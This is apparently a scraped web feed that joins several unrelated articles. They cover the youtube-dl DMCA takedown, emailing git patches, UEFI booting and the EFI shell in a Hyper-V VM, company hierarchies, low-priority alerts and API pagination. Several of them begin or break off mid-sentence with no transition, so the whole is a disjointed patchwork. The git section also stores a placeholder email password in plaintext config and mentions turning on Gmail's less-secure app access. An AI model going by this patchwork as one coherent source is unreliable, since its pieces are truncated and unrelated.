analyze videos, and you can just watch videos when there may be no stable Internet connection. This should be unequivocally allowed and even supported for the good of society, while keeping the ability of content producers to benefit from their creations.</blockquote><blockquote>In my time as maintainer, I declined numerous requests to support piracy sites and DRM-protected content. I can not speak for the project in the last years, but from what I've seen that policy has remained. To me, this is the right policy any legal project should follow.</blockquote><blockquote>In some locations, judges seem to have interpreted the law to be something it does not say. It should be clarified – whether by judges or lawmakers – to what is written down already and was intended: Proper DRM should not be subverted except for archiving purposes, but anything else is clearly allowed. Personally, I would go so far to require DRM schemes to decode timestamp and licenses to enable archiving. That's not to say I think that DRM subversion should be illegal in the first place, but that's a political rather than a legal issue.</blockquote><blockquote>GitHub is in no way to blame. They hosted the project for free, and we should thank them for that. I can understand that some people don't want to deal with the RIAA – maybe they are not even located in the US – and simply move the source code somewhere else, but I greatly appreciate GitHub's services and support. I hope they can work with future maintainer of youtube-dl to get the project back on GitHub.</blockquote><blockquote>My thanks go to everybody who has contributed so far to youtube-dl, but especially to the current maintainer Sergey. I hope somebody takes up the flag, source code, and distribution of youtube-dl, but I understand if Sergey doesn't want to deal with all of this trouble. Due to other personal &amp; open-source commitments as well as the ongoing legal affairs, I'm sad it can't be me. I wish the project all the best.</blockquote><blockquote>Copyright law is always a balance between creators and society. When it comes to being able to watch videos no matter the device or Internet connection, and doing so for non-commercial purposes, the balance we should strive for seems clear to me; it should allow youtube-dl.</blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Back when I was studying CS at university, we had assignments to code various algorithms. When the assignments were due we were supposed to execute the code in laboratory systems and get the output checked by the professors. I liked coding and tinkering with the algorithms; some of my classmates didn’t. They used to copy the code from my system on a USB stick and execute them on their system and get done with it. I didn’t judge them but I was tired of giving each one their copy and sometimes also instructing them how to execute that piece of code. In one such assignment, I uploaded the code on GitHub and shared the <a href="https://github.com/tarunbatra/re2nfa" target="_blank" rel="noopener">link</a> with anybody who asked. <strong>Unknowingly, I had made my first open source contribution.</strong></p>
<p>A lot of people have similar stories and for most, Github is synonymous with Open Source. One thing that is also used interchangeably with Github is git. Even though these are three different entities, a lot of developers including me have never contributed to open source or used git without Github. Thus I was surprised when I learned that famous open source projects like Linux were not on Github even though they used git. Also, git was around before Github, so there must be other more native ways in git to get things done. I wondered how it worked but didn’t do anything about it until recently when I decided to experience a git only development workflow.</p>
<h2 id="Git-server-access"><a href="#Git-server-access" title="Git server access"></a>Git server access</h2><p>We use version control systems broadly for two use cases – to contribute to a repository where we have write access; to contribute to a public repository where we don’t have write access. To collaborate with developers to whom access can be given, Github or other platforms are not necessary. Anybody can host a <a href="https://git-scm.com/book/en/v2/Git-on-the-Server-Setting-Up-the-Server" target="_blank" rel="noopener">Git server</a> that can be used to host repositories. Developers can clone, push to, and pull from these remote repositories once access is granted to their ssh identity.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git clone origin git@&lt;host&gt;/&lt;repo&gt;.git</span><br></pre></td></tr></tbody></table></figure>

<p>This is similar to how we upload our SSH keys to Github or other platforms for being able to clone the repositories using SSH.</p>
<h2 id="Pull-requests"><a href="#Pull-requests" title="Pull requests"></a>Pull requests</h2><p>One thing which is missing in the above-mentioned method is the ability to create Pull Requests, get them reviewed and merged into the code. It becomes a big issue when the developers don’t have write access to the repositories as is the case in open source development. General open source flow is to fork a repository, push the changes in your forked repositories, and create a <strong>pull request</strong> to the original repository from where the maintainers can review and merge. Pull request is not a feature of git, but of platforms like Github. Collaborative development in git has the following steps:</p>
<ol>
<li>Clone the original repository</li>
<li>Create a patch</li>
<li>Send the patch to the maintainer</li>
<li>The maintainer applies the patch and pushes the code</li>
</ol>
<p>We introduced two new processes in this workflow – creating a patch and applying a patch. Let’s discuss them further.</p>
<hr>
<h3 id="Patch"><a href="#Patch" title="Patch"></a>Patch</h3><p>A patch is a diff of code and metadata around it. A diff is the actual code change which can be viewed using the command <code>git diff</code>. It is a Unix concept that is way older than git and Unix systems even have a builtin tool, <a href="https://man7.org/linux/man-pages/man1/diff.1.html" target="_blank" rel="noopener"><code>diff</code></a> which compares changes between two files. Its output can then be saved to a file that can be processed by another utility tool called <code>patch</code> which updates one of the files to make its content identical to another file.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span>touch original.txt new.txt</span><br><span><span>echo</span> <span>"New addition"</span> &gt; new.txt</span><br></pre></td></tr></tbody></table></figure>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>diff original.txt new.txt -u &gt; changes.patch</span><br></pre></td></tr></tbody></table></figure>
<figure><figcaption><span>changes.patch</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></pre></td><td><pre><span></span><br><span></span><br><span>@@ -0,0 +1 @@</span><br><span><span>+New addition</span></span><br></pre></td></tr></tbody></table></figure>
<p>If we want to update the original file with the contents of the new one, we need to “patch” it.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>patch original.txt changes.patch</span><br></pre></td></tr></tbody></table></figure>
<p><strong>NOTE:</strong> <em>Use <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github repository</a> to practice this example and all the ones which are to follow.</em></p>
<p>Now that we understand the concepts of diff and patch, we can proceed with using them in git. To generate a patch file in git, we need to use <code>git format-patch</code> command.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git format-patch HEAD~1..HEAD</span><br></pre></td></tr></tbody></table></figure>

<p>This will create a patch file for the latest commit. Tinker with the argument to produce patch files for other commits too. By default, each file represents a single commit and the file name is of the format <code>0001-&lt;commit message&gt;.patch</code>. Interestingly, it is in <a href="https://en.wikipedia.org/wiki/Mbox" target="_blank" rel="noopener">Unix mbox</a> format which means it has some email-like metadata (from, subject, etc.) followed by the patch data.</p>

<p>This is the patch file I created to add my name to the contributors’ list of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository as an exercise for myself.</p>
<hr>
<h3 id="Apply"><a href="#Apply" title="Apply"></a>Apply</h3><p>We have a patch file which we can send to the maintainers so that they can apply the patch. We can either use traditional ways to send the patch or use git itself, but more on it later. In this section, we will explore the process to apply a patch.</p>
<p><code>git apply &lt;patch file&gt;</code> is a command which applies the changes described in the patch file locally but does not commit them. They will appear in our workspace and we can stage them and commit them. This is not ideal as even though we get the changes, the commit metadata like author name and message is lost. A better way to apply patches is <code>git am</code> (abbrev. for “apply mailbox”).</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git am --signoff &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>The flag <code>--signoff</code> is used if the commit message needs to be appended with a “Signed-off-by” line to indicate who applied the commit. Below is the signed-off and applied commit for the patch we generated as an exercise in the last section.</p>

<hr>
<h3 id="Sending-the-patch"><a href="#Sending-the-patch" title="Sending the patch"></a>Sending the patch</h3><p>Now we can explore how to send a patch file to a maintainer in the “git” way. There are two ways that I know of –</p>
<ol>
<li><p>imap-send</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git imap-send &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will upload the email to an IMAP folder from where it can be sent. To use it we need to add IMAP server details in our <code>~/.gitconfig</code> file. I use Gmail so my IMAP details look like:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span><span>[imap]</span></span><br><span>	folder = "[Gmail]/Drafts"</span><br><span>	host = imaps://imap.gmail.com</span><br><span>	user = email@gmail.com</span><br><span>	pass = yourpassword</span><br><span>	port = 993</span><br></pre></td></tr></tbody></table></figure>
<p>Gmail allows its IMAP server to be used if the <a href="https://myaccount.google.com/lesssecureapps" target="_blank" rel="noopener">Less secure app access</a> setting is turned on.</p>
</li>
<li><p>send-email</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git send-email --to=&lt;email&gt; &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will use an SMTP server to send email. The corresponding config to use this command is:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>[sendemail]</span></span><br><span>	smtpEncryption = tls</span><br><span>	smtpServer = &lt;host&gt;</span><br><span>	smtpUser = &lt;user&gt;</span><br><span>	smtpServerPort = 587</span><br></pre></td></tr></tbody></table></figure>
<p>Both of these methods can be used to send an email per patch file. The subject of the commit by default is of the format <code>[PATCH] &lt;commit message&gt;</code>.</p>
</li>
</ol>
<p><strong>NOTE:</strong> <em>Sender email addresses can be spoofed quite easily and this raises the question of authentication and authorization when submitting patches. I tried creating patches of PGP signed git commits but the patch doesn’t retain the PGP signature. We could encrypt the email itself using PGP but that’s a lot of extra work for both the contributor and the maintainer.</em></p>
<p>So what can we do with this newly acquired knowledge?</p>
<ol>
<li>Git patches often <a href="https://lkml.org/lkml/2020/10/16/629" target="_blank" rel="noopener">float</a> <a href="https://lkml.org/lkml/2020/10/19/82" target="_blank" rel="noopener">around</a> in the Linux development mailing list and it gives me satisfaction that I understand how they work a little better now than before.</li>
<li>When platforms like Github and Gitlab have an outage, work in most of the development teams stall. Now I know a way to get my code reviewed even in these situations. (Okay, that might be a stretch)</li>
<li>EDIT: About when this article was published, <a href="https://yt-dl.org/about.html" target="_blank" rel="noopener"><code>youtube-dl</code></a> was taken down by Github due to <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md" target="_blank" rel="noopener">a DMCA request</a>. The whole episode brings to light that Github being a platform is subject to censorship, unlike git which is distributed.</li>
</ol>
<p>You can practice for yourself by adding your name to the <code>CONTRIBUTORS.txt</code> file of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository, committing it, and then sending me the patch. I would readily <del>merge</del> apply it. 😀</p>

	<section>

<p>Some people may think some of my past posts get into the weeds, exploring the technical depths of Windows Autopilot, Intune, Windows 10, ConfigMgr, etc.&nbsp; But I would say those generally only get to the 300-level – I will leave out the really deep stuff because it can be harder to explain, and some people just might not care.&nbsp; But every so often, in an effort to maintain my sanity, I like to dive into a new topic to prove that I am still capable of learning new stuff and spending more than 30 minutes on said topic.&nbsp; And in this case, anyone reading this blog post will be coming along for the ride.&nbsp; We’ll see how many people make it all the way to the “end of the road.”</p>



<p>So what’s the topic?&nbsp; Something that I <a href="https://blogs.technet.microsoft.com/mniehaus/2011/06/10/mdt-2012-beta-1-uefi-support/" target="_blank">started talking about almost 10 years ago</a>, the Unified Extensible Firmware Interface (UEFI).&nbsp; Back then, it was more of a warning:&nbsp; The way you deploy Windows is going to change.&nbsp; Now, it’s a way of life (and fortunately, it no longer sucks like it did back in 2010 when we first started working with it).</p>



<p>I don’t want to rehash the “why’s” behind UEFI because frankly, you no longer have much of a choice:&nbsp; All new Windows 10 devices ship with UEFI enabled by default (and if you are turning it off, shame on you).&nbsp; Instead, I want to focus much more on how it works and what’s going on behind the scenes.</p>



<h3>Chapter 1: The boot process</h3>



<p>According to <a href="https://uefi.org/sites/default/files/resources/UEFI_Spec_2_8_final.pdf" target="_blank">the UEFI spec</a> (which is a really hard to follow document), a device will initially start up and look for a particular file based on the architecture of the system:</p>



<figure><table><tbody><tr><td>Architecture</td><td>File</td></tr><tr><td>x86 (32-bit)</td><td>bootia32.efi</td></tr><tr><td>x64 (64-bit)</td><td>bootx64.efi</td></tr><tr><td>ARM (32-bit)</td><td>bootarm.efi</td></tr><tr><td>ARM (64-bit)</td><td>bootaa64.efi</td></tr></tbody></table></figure>



<p>It will look in the \EFI\BOOT folder on accessible FAT32 volumes for this file.&nbsp; (The firmware can only read FAT32 file systems.&nbsp; GPT disks are suggested, although interestingly enough MBR disks would probably work too, at least per the UEFI spec.)&nbsp; That’s effectively a fallback mechanism – if nothing else loaded, search out something.&nbsp; But once you’ve installed an OS on the device, it will create firmware entries that provide alternative choices; UEFI will work its way down the list until it successfully loads one.&nbsp; Here’s what you would see for that firmware order on a Hyper-V VM that’s already running Windows 10:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb.png" alt="image"></a></figure>



<p>Notice that the first entry in the list points to \EFI\Microsoft\Boot\bootmgfw.efi, the Microsoft-provided boot manager; it then decided what OS to boot from the BCD.&nbsp; An interesting fact:&nbsp; If you look at the bootmgfw.efi file and compare it against the bootx64.efi file (you’ll have to assign a drive letter to the EFI partition to see these files), you’ll notice that they are exactly the same size:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-1.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-1.png" alt="image"></a></figure>



<p>That’s not a coincidence – they are actually the exact same file.&nbsp; So whether it’s loaded as a “last resort” by the firmware (bootx64.efi) or by the explicit firmware entry doesn’t matter, it does the same thing either way.&nbsp; </p>



<p>The boot manager will then boot an OS based on the BCD entries.&nbsp; For a Windows 10 OS, there will be an entry in the BCD that points to a particular volume as well as the path of the Windows boot loader that actually boots the OS, which is typically \windows\system32\winload.efi on that volume.&nbsp; Here’s the entry from my laptop:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-2.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-2.png" alt="image"></a></figure>



<p>Behind the scenes, that “partition=c:” entry really points to the ID of the volume (since drive letter assignments depend on the OS mappings, not the BCD or loader); BCDEDIT is making it more friendly.&nbsp; When winload.efi is loaded, it will find the actual Windows kernel and load it, which starts the actual OS boot process.</p>



<p>There’s one other interesting file that can come into play, hvloader.efi.&nbsp; This one is tied to the “hypervisorlaunchtype” BCD setting about.&nbsp; This one is for the Hyper-V hypervisor.&nbsp; The winload.efi boot loader will check this setting and automatically load hvloader.efi to launch the hypervisor.&nbsp; The exact mechanism for that isn’t 100% clear to me – that was a rabbit hole I didn’t want to go down.&nbsp; </p>



<p>One other point worth mentioning in this process:&nbsp; If secure boot is enabled, all of the mentioned files will be checked to make sure that they are properly signed and unmodified.&nbsp; If the boot process gets far enough for the NTOS kernel to run, it will also perform verification of critical boot files.&nbsp; This is a key UEFI and Windows security feature, and why you should always run with UEFI and Secure Boot enabled, except when testing or playing (and we’ll do plenty of that later).</p>



<h3>Chapter 2: What are these EFI files anyway?</h3>



<p>I remember reading in the UEFI specifications a long time ago that UEFI used <a href="https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface" target="_blank">“EFI byte code” (EBC)</a>.&nbsp; That would mean special tools, compilers, etc.&nbsp; Well, I was wrong.&nbsp; Yes, such a thing exists, but it’s primarily for cross-platform drivers, and apparently is not used very often.&nbsp; So these EFI files (like bootmgfw.efi) are just typical executables, and can be written in any language and compiled into something that’s pretty close to a standard binary.&nbsp; C and assembly language are the most common languages used, and both are used in the <a href="https://github.com/tianocore/edk2" target="_blank">source code for UEFI itself</a> (the EDK2 repository, part of the <a href="https://www.tianocore.org/" target="_blank">Tianocore project</a>).</p>



<p>At the moment at least, my interest isn’t in writing UEFI code.&nbsp; But there is one piece of UEFI code that would come in very handy to explore some of the “behind the scenes” operations of UEFI: the EFI shell.&nbsp; Think of this as a sort of “UEFI command prompt” that has a number of built-in commands for working with UEFI itself.&nbsp; The source code is included in the EDK2 project, it just needs to be built (compiled/linked).</p>



<p>OK, so how to build it?&nbsp; There are <a href="https://github.com/tianocore/tianocore.github.io/wiki/Windows-systems" target="_blank">some instructions in the Tianocore Github content</a>.&nbsp; Those instructions are OK, but not perfect.&nbsp; Here’s a high-level summary of what I did:</p>



<ul><li>Install Visual Studio 2019 (even though it isn’t listed as officially supported in the EDK2 documentation – that stops at Visual Studio 2017).&nbsp; Make sure you install the desktop development tools.&nbsp; (I included MSVC v141, which is the VS2017 version.&nbsp; I think that was necessary, just didn’t take the time to prove it.)</li><li>Install <a href="https://www.python.org/" target="_blank">Python 3.7</a> or later to C:\Program Files\Python37.&nbsp; Set a system environment variable PYTHON_HOME to “C:\Program Files\Python37” (without the quotes, without a trailing backslash).</li><li>Install the <a href="https://github.com/tianocore/tianocore.github.io/wiki/Nasm-Setup" target="_blank">NASM open-source assembly compiler</a> to C:\Program Files\NASM.&nbsp; Set a system environment variable NASM_PREFIX to “C:\Program Files\NASM\” (without the quotes, with the trailing backslash).</li><li>Install the <a href="https://github.com/tianocore/tianocore.github.io/wiki/Asl-Setup" target="_blank">ASL compiler</a> to C:\ASL</li><li>Install <a href="http://git-scm.com/download/win" target="_blank">Git GUI</a>.&nbsp; </li><li>Clone the EDK2 repository from Git GUI, specifying a source location of <a title="https://github.com/tianocore/edk2.git" href="https://github.com/tianocore/edk2.git">https://github.com/tianocore/edk2.git</a> and a target of C:\EDK2.</li><li>Edit the “C:\EDK2\Conf\target.txt” file to specify the following values:
<p>ACTIVE_PLATFORM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = MdeModulePkg/MdeModulePkg.dsc<br>TARGET_ARCH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = X64</p></li></ul>



<ul><li>Open an elevated command prompt and change to the C:\EDK2 directory</li><li>Run “edksetup.bat Rebuild”.</li><li>Run “build”.</li></ul>



<p>If all of that works, you should then have a full build of the main UEFI code.&nbsp; But you still won’t have the UEFI shell.&nbsp; So a little more is required:</p>



<ul><li>Open an elevated command prompt and change to the C:\EDK2 directory</li><li>Run “edksetup.bat”.</li><li>Run “build -p ShellPkg\ShellPkg.dsc”</li></ul>



<p>After doing that, you should find the resulting shell.efi file in C:\EDK2\Build\Shell\DEBUG_VS2017\X64\ShellPkg\Application\Shell\Shell\DEBUG.&nbsp; Now, let’s try to use it…</p>



<h3>Chapter 3: Booting to the EFI shell </h3>



<p>Let’s start off with something really simple:&nbsp; A brand-new VM with no operating system on it.&nbsp; Based on the previous discussions, all we should need to do is create a FAT32 disk, place the EFI file in the right place, and then boot.&nbsp; So let’s try it.&nbsp; Here are the steps:</p>



<ul><li>Create a new VM in Hyper-V (4GB RAM, a small expanding VHDX, gen 2, two processors – typical stuff).&nbsp; Don’t start it yet.</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-3.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-3.png" alt="image"></a></figure>



<ul><li>Find the VHDX file in File Explorer and double-click it to mount it.&nbsp; You’ll get a message like this:</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-4.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-4.png" alt="image"></a></figure>



<ul><li>Do as it says: Open Disk Management, initialize the disk, and then create a small FAT32 partition.</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-5.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-5.png" alt="image"></a></figure>



<ul><li>It should look like this (the E: drive):</li></ul>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-6.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-6.png" alt="image"></a></figure>



<ul><li>Navigate to the drive (E: from my example) in File Explorer.&nbsp; Create an E:\EFI\BOOT folder structure, then copy the shell.efi file into it, renaming it to bootx64.efi (remember that from above?).</li></ul>



<blockquote><p> Directory of e:\EFI\BOOT</p><p>09/02/2019&nbsp; 12:08 AM&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .<br>
09/02/2019&nbsp; 12:08 AM&nbsp;&nbsp;&nbsp; &lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ..<br>
09/01/2019&nbsp; 12:31 AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 976,960 bootx64.efi<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 976,960 bytes</p></blockquote>



<p>Right-click on the drive (e.g. E:\) in File Explorer and eject it (which unmounts it).</p>



<p>Now you can start the VM – and see it fail with an error like this:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-7.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-7.png" alt="image"></a></figure>



<p>That’s actually a good sign: The UEFI firmware attempted to load the EFI shell (shell.efi renamed to bootx64.efi), but it failed.&nbsp; Any guesses as to why from the error message on the screen, “unsigned image’s hash is not allowed”?&nbsp; Simple, it’s a Secure Boot error.&nbsp; The EFI executable isn’t signed by Microsoft – actually it isn’t signed at all.&nbsp; So to get it to run, we need to turn off Secure Boot.&nbsp; Turn off the VM and change the setting:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-8.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-8.png" alt="image"></a></figure>



<p>Apply the change, then start the VM again.&nbsp; Now we see something much better:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-9.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-9.png" alt="image"></a></figure>



<p>As you can see in that output, the device is running UEFI shell 2.2 (the most recent version of the spec), UEFI 2.7 (pretty recent, there is a 2.8 version now), and Microsoft is the vendor (as expected in Hyper-V).&nbsp; If you look at a directory of the FS0: volume:</p>



<figure><a href="https://oofhours.files.wordpress.com/2019/09/image-10.png"><img src="https://oofhours.files.wordpress.com/2019/09/image_thumb-10.png" alt="image"></a></figure>



<p>You can see that it is the FAT32 volume that we prepared before, with the renamed shell.efi loaded by the virtual machine automatically.</p>



<p>See page 92 of <a href="https://uefi.org/sites/default/files/resources/UEFI_Shell_2_2.pdf" target="_blank">the UEFI Shell 2.2 spec</a> for all the commands that are accepted.&nbsp; The one that I am most interested in is “dmpstore” because it will dump out all of the UEFI variables.&nbsp; You can specify that you want all variables (-all), and that you want to page through them on the screen (-b, useful to see the names on the screen).&nbsp; Here’s an example from …</p></section></article></div>

But it is a useful representation to understand how hierarchies simplify the sharing of information by creating highways for it.

While the ‘x’ nodes focus on the work at hand, the ‘o’ nodes are busy talking and aligning amongst themselves. This creates two problems: the ‘o’s lose touch with the actual work being done, while the ‘x’s cannot easily see, communicate, or influence beyond team boundaries. Which, remember, is why you’ll be surprised when Beezlyboo lands on your desk in two weeks' time.</p><h3>What Companies Are Doing About This Today</h3><p>So far we've been talking about idealized companies. In reality, there are informal networks that permeate company hierarchies. There are also good and bad ‘x’s and ‘o’s. We know a lot about what a good ‘o’ is (or should be). There’s an <a href="https://www.forbes.com/sites/vickyvalet/2019/03/19/americas-best-management-consulting-firms-2019/#656906003d00">entire industry out there dedicated to this</a>, complete with degrees (MBAs) and reading material (those management books you tend to find in airport bookshops).</p><p>One thing ‘o’s obsess over is how best to organize things, which is great. That's their job, after all. The problem is that their solutions are often clunky. Do any of these sound familiar?</p><ul><li><b>Culture stuff:</b> the ‘o’s realize the company’s formal and informal hierarchies are too strong, so they begin promoting things like guilds, societies, team building activities, random coffee catchups between senior leads and juniors, etc.</li><li><b>Reorgs:</b> featuring endless tweaks to the traditional hierarchical org structure (functional, divisional, matrix/cross-functional… you name it). Ironically, it’s the ‘o’s that instigate these —  often to the complete bewilderment of the ‘x’s.</li><li><b>Surveys:</b> because making the ‘x’s click through an annoying ten-page annual survey is a great way of discovering how they really feel. Right? Right. </li></ul><p>If these solutions sound drab and disengaging, it's because they are. <a href="https://en.wikipedia.org/wiki/Ronald_Coase">Ronald Coase</a>, the 1991 Nobel laureate in economics, published an <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1468-0335.1937.tb00002.x">influential essay in 1937</a> on why firms even appear, and mentions that the benefits of larger firms are quickly outweighed by the overheads of maintaining their complex hierarchies and the misallocations of resources which stem from this. In a more modern work, Gary Hammel and Michele Zanini demonstrate in <a href="https://www.humanocracy.com/">Humanocracy</a> -- another one of those airport books -- that:                </p><p>A <a href="https://www.gallup.com/workplace/236552/managers-engaged-jobs.aspx">2018 Gallup study</a> found two-thirds of US employees and 51 percent of US managers to be disengaged at work.</p><p>In 2018, there were 146 million employees in the US workforce. [...] Of these, 20.5 million were managers and supervisors. In addition, there were 6.4 million employed in administrative support functions. In total, then, the bureaucratic class comprises 26.9 million individuals or 18.4 percent of the US workforce. [...] claiming more than $3.2 trillion in compensation, or nearly a third of America’s total wage bill.</p><p>They argue that, if we could repurpose a fraction of this managerial bloat into more productive pursuits, we would free up a lot of unproductive excess wages and therefore raise productivity, overall compensation (for the rest of us), and employee engagement.</p><p><b>Genghis:</b> Okay, kiddo, that's great... but we're trying to run a Khanate company that stretches from eastern Europe to China. Maybe our team building activities are a little boring, and we do like a good reorg, especially after we invade acquire a new company, but what are you proposing? That we fire all our generals and officers and turn into those Valve hippies? <br><b>Ogedei (You):</b> Not at all. Hear me out.</p><h3>What the Future Might Look Like</h3><p>With everyone and <a href="https://www.itv.com/news/wales/2020-03-19/people-stuck-at-home-are-sharing-pictures-of-their-cat-and-dog-coworkers">their cat</a> — not to mention the <a href="https://www.oecd.org/future-of-work/">OECD</a> — talking about the Future of Work these days, isn’t it time we began trying to tackle company organization with more pizazz? You know, just throw some tech and AI at it.</p><p><b>Genghis:</b> Oh god, here we go again with your AI thing.<br></p><p>He's right: here we go.<a href="#3po"><sup id="3pr">3</sup></a> One of the most significant transformations due to play out over the next decade is the <a href="https://www.cnbc.com/2019/06/20/slack-ceo-predicts-end-of-company-email-as-we-know-it-in-7-years.html">death of email</a> in within-company communications and its replacement by tools like Slack and Teams. Not only do Slack and Teams introduce a new medium for companies to communicate in, they also allow for modern third-party integrations via their APIs. That’s something email tools like Gmail or Outlook never quite got right.</p><p>On top of this, there's an unfolding generational shift. Millennials will continue to graduate to positions of power as the 2020s progress — and they’ve grown up using online chat protocols and social networks.</p><p><b>Ogedei:</b> So here’s the thing, Dad.

  <time datetime="2020-10-12T00:00:00+00:00">12 Oct 2020</time>
  <p>PagerDuty and other alerting systems let users specify the priority of an alert. High priority alerts are supposed to page an engineer (“the site is down”), and low priority alerts are meant to warn users of impending issues - PagerDuty’s example for a low priority alert is <a href="https://response.pagerduty.com/oncall/alerting_principles/#an-ssl-certificate-is-due-to-expire-in-one-week">“An SSL certificate is due to expire in one week”</a>. In theory, a low priority alert is one that an oncall engineer looks at when there’s no high priority alerts to take care of, and resolves their root cause via some kind of change.</p>

<p>In my experience, low priority alerts often have low value, add a subtle cost, and are prone to bit rot, just like poorly tested code.</p>

<p>Low priority alerts have a low barrier to entry - since they do not wake up engineers at 3 AM, they aren’t tuned as rigorously as high priority alerts. And the ROI of fixing low priority alerts is often just slight reduction of noise in an often already noisy slack channel - the incremental effect of a noisy alert going away doesn’t appear to be much.</p>

<p>In many cases, alerts aren’t tuned loosely enough for slight changes in service behavior and load patterns. For example, slightly increased release time for a service might fire some low priority alerts that were designed to check some invariants, or lower than normal load patterns due to holidays fire some “atleast X 200s from the service alerts”. The team gets trained to ignore these since they resolve without intervention. These issues tend to be hidden until “service life events”, like handing off a service to a new team which has very limited context on the efficacy of existing alerts.</p>

<p>Low priority alerts have another downside - they end up becoming a lazy action item to tackle after an incident, and create a false sense of security. Often, teams dont’t want to put in too much work to add metrics and build a reliable alert for the obscure part of their system that failed. So it’s easy to think that you’ve done <em>something</em> by adding a low priority alert for reducing “time to detection”.</p>

<p>One data point in favor of this argument is that the Google SRE book does not seem to mention low priority alerts, just “tickets, email alerts, and pages”, where email alerts are described as <a href="https://landing.google.com/sre/sre-book/chapters/monitoring-distributed-systems/#id-LvQuvtYS7UvI8h4">alert spam</a>, as they are “rarely read or acted on”, acting in practice very similar to low priority alerts.</p>

<p>A good counter-argument is that a strong team with well defined processes for oncall handoffs will ensure low priority alerts get triaged and resolved. In practice, I’ve noticed that rigorous process falls apart when the few key engineers upholding such practices switch roles, since the real world consequences of a few mistuned low priority alerts firing don’t seem dire. In other cases, low priority alerts are often ignored while ramping up new engineers to the oncall rotation, and the culture of the team slowly shifts since “they’re not looking at these alerts, so why should I”.</p>

<p>Does that mean we should get rid of low priority alerts entirely? I strive to keep as few low priority alerts as possible in production services, and I’m not sure I have a better answer than that. Low priority alerts can be useful if they can automatically pause a deployment pipeline. For example, an alert for slightly elevated error rate is a great indicator to stop a rollout while it’s on canary.</p>

<p>In general, maintain high standards for low priority alerts - would we care if this alert didn’t actually work? Are we giving ourselves a false sense of security by adding this alert? What standards do we have for existing low priority alerts? Will we rigorously tune this alert if it’s noisy? Hopefully this helps you decide on an alternative or is something to think about.</p>

<![CDATA[API Pagination Design]]>

<br/>
October 25, 2020 | https://solovyov.net/blog/2020/api-pagination-design/ | <a href="https://web.archive.org/web/*/https://solovyov.net/blog/2020/api-pagination-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><p>Returning all results for a given query could be a challenge for an API, especially if there are thousands of results. It puts a load on a server, on a client, on a network, and often is unnecessary. Thus people invented pagination.</p>
<p>The usual way to paginate is an offset or a page number. So you make a request like that:</p>
<pre><code>GET /api/products?page=10
{"items": [...100 products]}
</code></pre>
<p>and to continue you make a request like that:</p>
<pre><code>GET /api/products?page=11
{"items": [...another 100 products]}
</code></pre>
